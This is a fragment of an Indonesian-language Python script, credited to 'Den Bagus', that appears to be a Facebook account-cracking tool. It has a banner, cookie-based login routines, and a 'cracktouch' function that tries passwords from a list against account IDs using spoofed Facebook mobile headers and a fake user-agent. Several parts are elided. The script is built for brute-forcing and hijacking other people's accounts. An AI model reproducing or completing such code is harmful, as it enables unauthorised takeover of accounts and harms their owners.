...
\t|  _ \  ___ _ __  | __ )  __ _  __ _ _   _ ___| || |  / _ \| || |
\t| | | |/ _ \ '_ \ |  _ \ / _` |/ _` | | | / __| || |_| | | | || |_
\t| |_| |  __/ | | || |_) | (_| | (_| | |_| \__ \__   _| |_| |__   _|
\t|____/ \___|_| |_||____/ \__,_|\__, |\__,_|___/  |_|  \___/   |_|
\t                                |___/

			{m}•{k}•{h}•{sir} Created By : Den Bagus {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© XTC : [green]Cookiedough[white] ©©©'))
		...
		print(f'  %s[%sx%s]%s LOGIN GAGAL.....CEK TUMBAL LU NGAB !!%s'%(x,k,x,m,x))
		exit()
def bot():
	try:
...
def cracktouch(idf,pwv):
	...
	for pw in pwv:
		try:
			head = {"x-fb-connection-bandwidth": str(random.randint(2000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
